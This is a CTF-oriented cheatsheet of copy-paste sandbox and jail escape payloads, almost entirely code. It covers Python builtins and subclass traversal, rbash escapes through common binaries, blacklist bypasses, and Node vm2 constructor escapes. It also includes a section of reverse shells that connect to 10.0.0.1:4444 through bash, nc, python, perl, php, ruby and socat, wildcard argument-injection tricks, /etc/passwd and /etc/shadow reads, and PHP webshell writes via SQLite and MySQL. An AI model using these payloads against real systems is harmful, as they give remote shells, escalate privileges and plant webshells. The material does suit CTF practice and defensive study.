---
title: "Jail Escape Payloads - Python, Shell, JavaScript"
category: misc
subcategory: jail
type: cheatsheet
tags: [pyjail, jail-escape, sandbox-escape, payloads, subclasses, builtins, no-letters, no-digits, rbash, ifs, bashfuck, vm2, constructor-constructor, gtfobins, cheatsheet]
summary: "Copy-paste payloads for python, shell and javascript jails, organised by the restriction you are facing."
tools: [python3, bash, node]
related: [python-jail-escape, python-jail-restricted-chars, shell-jail-escape, js-sandbox-escape, eval-jail-generic, gtfobins-quickref, ctf-general-cheatsheet]
---

## Python - reconnaissance (run these first)

```python
# what is in scope
dir()
globals()
locals()
vars()
__builtins__
type(__builtins__)                  # module in __main__, dict elsewhere
dir(__builtins__)
[x for x in dir(__builtins__) if 'imp' in x]
().__class__
().__class__.__base__
len(().__class__.__base__.__subclasses__())
[c.__name__ for c in ().__class__.__base__.__subclasses__()]
__import__
open
breakpoint
help
print
input
exec
eval
compile
getattr
setattr
globals
```

## Python - full builtins available

```python
__import__('os').system('sh')
__import__('os').popen('id').read()
__import__('subprocess').run(['sh'])
__import__('subprocess').check_output('id', shell=True)
__import__('pty').spawn('/bin/bash')
eval(compile('import os;os.system("sh")', '<x>', 'exec'))
exec('import os;os.system("sh")')
open('/flag').read()
print(open('/flag').read())
__import__('pathlib').Path('/flag').read_text()
breakpoint()
help()                              # then type a module name, or !sh on some pagers
license()
__import__('antigravity')           # opens a browser: proof of code execution
__import__('socket').create_connection(('127.0.0.1',4444))
exec(input())
eval(input())
exec(__import__('sys').stdin.read())
```

## Python - no builtins (`{"__builtins__": {}}`)

```python
# every function object carries the globals of the module it was defined in
(lambda:0).__globals__['__builtins__']['__import__']('os').system('sh')
(lambda:0).__globals__['__builtins__']['open']('/flag').read()
(lambda:0).__globals__['__builtins__']['eval']('__import__("os").system("sh")')

# subclass walk - ALWAYS filter by name, never by index
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='Popen'][0](['sh'])
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['system']('sh')
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['popen']('id').read()
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='catch_warnings'][0]()._module.__builtins__['__import__']('os').system('sh')
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='BuiltinImporter'][0].load_module('os').system('sh')
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileIO'][0]('/flag').read()
[c for c in ().__class__.__base__.__subclasses__() if 'os' in getattr(c,'__module__','')]

# other spellings of the same traversal
''.__class__.__mro__[1].__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
object.__subclasses__()
type.__subclasses__(object)
().__class__.__bases__[0].__subclasses__()

# builtins from any loaded class
().__class__.__base__.__subclasses__()[0].__init__.__globals__['__builtins__']

# exception traceback -> the caller's frame -> its globals (statement form)
try:
    raise ValueError
except ValueError as e:
    e.__traceback__.tb_frame.f_back.f_globals['__builtins__']['__import__']('os').system('sh')
```

## Python - `import` blocked

```python
__import__('os')
__builtins__.__dict__['__import__']('os')
__loader__.load_module('os')
importlib = __import__('importlib'); importlib.import_module('os')
__import__('importlib').__import__('os')
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='BuiltinImporter'][0].load_module('os')
__import__('imp') if False else None      # removed in 3.12, do not rely on it
globals()['__builtins__']['__import__']('os')
```

## Python - string blacklist ("os", "flag", "import" ...)

```python
'o'+'s'
"".join(['o','s'])
'os'[::-1][::-1]
'so'[::-1]
chr(111)+chr(115)
bytes([111,115]).decode()
'%s%s' % ('o','s')
f"{'o'}{'s'}"
'os'.upper().lower()
__import__('o'+'s')
getattr(__import__('o'+'s'), 'sys'+'tem')('sh')
exec(bytes.fromhex('696d706f7274206f733b6f732e73797374656d282773682729'))
exec(__import__('base64').b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnc2gnKQ=='))
exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73')
exec('\151\155\160\157\162\164\40\157\163')
exec(__import__('codecs').decode('vzcbeg bf','rot13'))
exec(__import__('zlib').decompress(b'...'))
```

## Python - no digits

```python
True + True                      # 2
True + True + True               # 3
-~0                              # 1
-~-~0                            # 2
int(True)                        # 1
len([[]])                        # 1
len('aaaa')                      # 4
len(str(True))                   # 4  ('True')
(True<<True)                     # 2
(True<<(True+True))              # 4
(True<<(True+True+True))         # 8
ord(min(str(True)))              # 84  ('T')
len(dir())                       # whatever is in scope
```

## Python - no letters (identifiers via NFKC normalisation)

```python
ｅｘｅｃ('import os')              # U+FF45 etc, fullwidth -> NFKC folds to 'exec'
ｅｖａｌ('1+1')
𝘦𝘹𝘦𝘤('import os')                # mathematical italic
ｇｅｔａｔｔｒ((), '__class__')
ｏｐｅｎ('/flag').ｒｅａｄ()
# characters harvested from reprs (no letters typed at all)
str(())[True]                    # ')'
str({})[True]                    # '}'
str(...)                         # 'Ellipsis'
str(True)                        # 'True'
str(False)                       # 'False'
str({}.values())                 # 'dict_values([])'  <- the underscore source
str(().__class__)                # "<class 'tuple'>"
str(().__doc__)                  # a sentence of letters
```

## Python - no underscores

```python
getattr((), str({}.values())[4]*2 + 'class' + str({}.values())[4]*2)
vars(obj)                        # instead of obj.__dict__
type(obj)                        # instead of obj.__class__
type(()).mro()                   # instead of __mro__
dir(obj)                         # discovery
type.mro(type(()))
object.__subclasses__            # still has dunders; use getattr with a built name
help(obj)
```

## Python - no dots

```python
getattr(obj, 'attr')
getattr(getattr(obj,'a'),'b')
vars(obj)['attr']
obj['key']
__import__('operator').attrgetter('a.b.c')(obj)
__import__('operator').methodcaller('system','sh')(os)
[x for x in dir(obj)]
```

## Python - no quotes

```python
chr(115)+chr(104)                # 'sh'
str(())[True]                    # slice out of a repr
bytes([115,104]).decode()
().__doc__[3]
exec(input())                    # quotes come from stdin
eval(input())
__import__(chr(111)+chr(115))
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()
```

## Python - no parentheses

```python
@exec
class X: pass                    # the decorator performs the call
@breakpoint
class Y: pass
import os                        # statements need no parentheses
raise SystemExit                 # class instantiated by the raise statement
[y := 1 for x in [1]]            # assignment expression in a comprehension
obj @ other                      # __matmul__
-obj                             # __neg__
obj[key]                         # __getitem__
obj < other                      # __lt__
```

## Python - short payloads (length-limited)

```python
exec(input())                    # 13 - the universal answer
eval(input())                    # 13
breakpoint()                     # 12
help()                           # 6
license()                        # 9
import os                        #  9
open('/flag')                    # 13
print(open('f').read())          # 23
__import__('os').system('sh')    # 29
import os;os.system('sh')        # 25
```

## Python - AST/whitelist evaluators

```python
().__class__                     # any allowed ast.Attribute is an escape
f'{().__class__}'                # JoinedStr hides the attribute from a source grep
[x for x in ().__class__.__base__.__subclasses__()]      # ListComp
(y := ().__class__)              # NamedExpr
9**9**9                          # resource exhaustion, no execution needed
'a'*10**9                        # memory exhaustion
lambda: ().__class__             # Lambda
{}.__class__                     # Subscript-free attribute access
```

## Shell - restricted shell (rbash) escape

```bash
bash
sh
bash --noprofile --norc
BASH_CMDS[x]=/bin/sh; x
export -f f
vi -c ':!/bin/sh' /dev/null
vim -c ':!/bin/sh'
ed
!/bin/sh
less /etc/passwd            # then: !/bin/sh
more /etc/passwd            # then: !/bin/sh
man man                     # then: !/bin/sh
awk 'BEGIN {system("/bin/sh")}'
gawk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
find / -maxdepth 0 -exec /bin/sh \;
python3 -c 'import os;os.system("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'
node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'
php -r "system('/bin/sh');"
env /bin/sh
script -q /dev/null /bin/sh
socat file:`tty`,raw,echo=0 exec:'/bin/sh',pty,stderr
busybox sh
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/x.zip /etc/hostname -T -TT 'sh #'
gdb -nx -ex '!sh' -ex quit
git -p help
ssh -o ProxyCommand='/bin/sh -i 2>&0' x@127.0.0.1
ssh localhost -t "/bin/sh"
rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
nmap --interactive          # ancient versions only, then: !sh
ftp
!/bin/sh
expect -c 'spawn /bin/sh; interact'
```

## Shell - no spaces

```bash
cat${IFS}/etc/passwd
cat${IFS}$9/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'\x20';cat${X}/etc/passwd
IFS=,;`cat,/etc/passwd`
echo${IFS}hello
cat$'\t'/etc/passwd
```

## Shell - no slashes

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat ${PWD:0:1}etc${PWD:0:1}passwd
cd etc; cat passwd
X=$(echo /);cat ${X}etc${X}passwd
echo . | tr '.' '/'
```

## Shell - blacklisted words

```bash
c'a't /etc/passwd
c"a"t /etc/passwd
ca\t /etc/passwd
ca""t /etc/passwd
ca$@t /etc/passwd
/bi''n/ca''t /etc/passwd
a=c;b=at;$a$b /etc/passwd
/???/c?t /etc/passwd
/bin/c?t /e*c/pa??wd
/usr/bin/w*i
$(rev<<<'tac') /etc/passwd
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
$'\x63\x61\x74' /etc/passwd
printf '\x63\x61\x74' | sh
```

## Shell - no alphanumerics

```bash
__=$'\163\150';$__                       # runs 'sh'
_=$'\x2f\x62\x69\x6e\x2f\x73\x68';$_     # runs /bin/sh
$'\163\150'
${!#}                                    # last positional parameter expansion trick
$0                                       # the shell's own name
${0##*/}
echo ${##}                               # length of $#
$'\x63\x61\x74'<${0}                     # cat the shell binary
```

## Shell - wildcard / argument injection

```bash
# a cron job or script that runs `tar cf x.tar *` in a writable directory
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
# `chown -R u *` or `chmod -R 0777 *`
touch -- '--reference=/etc/shadow'
# `rsync * dest`
touch -- '-e sh payload.sh'
# `7z a backup.7z *`
touch @flag.txt && ln -s /root/flag.txt flag.txt
# `zip x.zip *`
touch -- '-T'
touch -- '-TT sh payload.sh'
```

## Shell - upgrade a dumb shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# then: Ctrl-Z ; stty raw -echo; fg ; reset ; export TERM=xterm SHELL=/bin/bash
script -q /dev/null -c bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
stty rows 50 cols 200
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## Shell - reverse shells

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'
sh -i >& /dev/udp/10.0.0.1/4444 0>&1
nc -e /bin/sh 10.0.0.1 4444
nc 10.0.0.1 4444 -e /bin/sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

## JavaScript / Node

```javascript
// reconnaissance
Object.getOwnPropertyNames(globalThis).join(',')
typeof process; typeof require; typeof global; typeof module
this.constructor.name
Object.getPrototypeOf(this)

// the constructor chain (needs a HOST object in plain vm)
this.constructor.constructor('return process')()
''.constructor.constructor('return process')()
[].constructor.constructor('return process')()
({}).constructor.constructor('return process')()
(function(){}).constructor('return process')()
Object.constructor('return process')()

// from process to a shell
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()
process.mainModule.require('child_process').execSync('cat /flag').toString()
process.binding('spawn_sync')
module.constructor._load('child_process').execSync('id')
require('module')._load('child_process')
global.process.env

// file read without child_process
this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('/flag','utf8')
process.binding('fs')

// vm2-shaped host-object leak
Error.prepareStackTrace=(e,f)=>f[0].getThis().constructor.constructor('return process')();new Error().stack
Promise.resolve().then(function(){return this})

// string blacklist bypasses
globalThis['pro'+'cess']
['p','r','o','c','e','s','s'].join('')
String.fromCharCode(112,114,111,99,101,115,115)
eval(atob('cHJvY2Vzcw=='))
Function('return pro'+'cess')()

// exfiltrate when output is swallowed
throw this.constructor.constructor('return process')().env.FLAG
```

## SQL / DSL one-liners

```sql
-- SQLite
SELECT name,sql FROM sqlite_master;
SELECT readfile('/flag');
SELECT writefile('/tmp/x','data');
ATTACH DATABASE '/var/www/html/s.php' AS s; CREATE TABLE s.t(c TEXT);
INSERT INTO s.t VALUES ('<?php system($_GET[0]);?>');
SELECT load_extension('/tmp/e.so');
SELECT char(47,102,108,97,103);
-- PostgreSQL
COPY t FROM PROGRAM 'id';
SELECT pg_read_file('/flag');
SELECT pg_ls_dir('/');
-- MySQL
SELECT LOAD_FILE('/flag');
SELECT '<?php system($_GET[0]);?>' INTO OUTFILE '/var/www/html/s.php';
```

```lua
-- Lua
os.execute("/bin/sh")
io.popen("id"):read("*a")
require("os").execute("id")
package.loadlib("/lib/x86_64-linux-gnu/libc.so.6","system")("id")
load("return 1+1")()
getmetatable("").__index
for k,v in pairs(_G) do print(k) end
```

```ruby
# Ruby
`id`
%x(id)
system("id")
exec("/bin/sh")
IO.popen("id").read
Kernel.send(:system,"id")
File.read("/flag")
```

```php
// PHP
system('id'); passthru('id'); shell_exec('id'); exec('id'); `id`;
eval($_POST['c']);
include('php://input');
include('data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOw==');
```

```text
# Java expression languages
T(java.lang.Runtime).getRuntime().exec('id')                       # SpEL
new java.lang.ProcessBuilder(new String[]{'sh','-c','id'}).start() # SpEL
@java.lang.Runtime@getRuntime().exec('id')                         # OGNL
''.class.forName('java.lang.Runtime')                              # generic
```
